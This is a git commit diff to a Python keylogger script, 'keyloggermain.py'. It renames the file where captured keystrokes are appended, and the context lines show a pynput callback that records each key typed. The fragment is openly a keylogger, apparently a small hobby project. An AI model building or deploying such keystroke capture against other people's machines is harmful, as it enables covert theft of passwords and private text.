78b581b6c53c2874f818971fb6c8b89f4aebc487
ajayx29 <78142053+ajayx29@users.noreply.github.com>
2023-11-22 20:45:12 +0530

    Update keyloggermain.py

--- keyloggermain.py
+++ keyloggermain.py
@@ -2,7 +2,7 @@ from pynput import keyboard
 
 def keyPressed(key):
     print(str(key))
-    with open("keyfile.txt", 'a') as logKey:
+    with open("log.txt", 'a') as logKey:
         try:
             char = key.char
             logKey.write(char)
